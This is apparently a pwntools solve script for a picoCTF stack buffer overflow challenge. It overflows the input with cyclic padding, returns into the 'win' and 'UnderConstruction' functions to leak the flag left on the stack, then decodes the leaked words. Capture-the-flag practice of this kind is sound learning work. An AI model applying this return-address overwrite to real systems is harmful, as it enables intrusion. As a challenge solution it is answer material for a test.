'''
garbage still on stack!!

vuln -> win -> UnderConstruction

win
- flag saved at `0xffebd97c + ...`

UnderConstruction
- leak data from `0xffebd9a0` to `0xffebd97c`
'''
from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes

host = 'saturn.picoctf.net'
port = 49565

elf = ELF('./vuln')

context.binary = elf
context.terminal = ['tmux', 'splitw', '-v']

gdb_script = '''
b main
b vuln
'''

under_construction = elf.symbols['UnderConstruction']
win = elf.symbols['win']

def conn():
    if args.EXPLOIT:
        r = remote(host, port)
    else:
        if args.LD_PRELOAD:
            import os
            r = process([elf.path], env={**os.environ, "LD_PRELOAD": args.LD_PRELOAD})
        else:
            r = process([elf.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    return r

def solve(r):
    r.recvuntil(b'flag\n')
    padding = cyclic_find(0x61656161)
    payload = b'a' * padding
    payload += p32(win)
    payload += p32(under_construction)
    r.sendline(payload)
    r.recvline()
    ret = r.read(155)
    ret = [s[2:] for s in ret.split() if s.startswith(b'0x')]
    flag = long_to_bytes(int(b''.join(ret), 16))[::-1]
    print (flag[:flag.find(b'}') + 1].decode())

if __name__ == '__main__':
    r = conn()
    solve(r)
    r.close()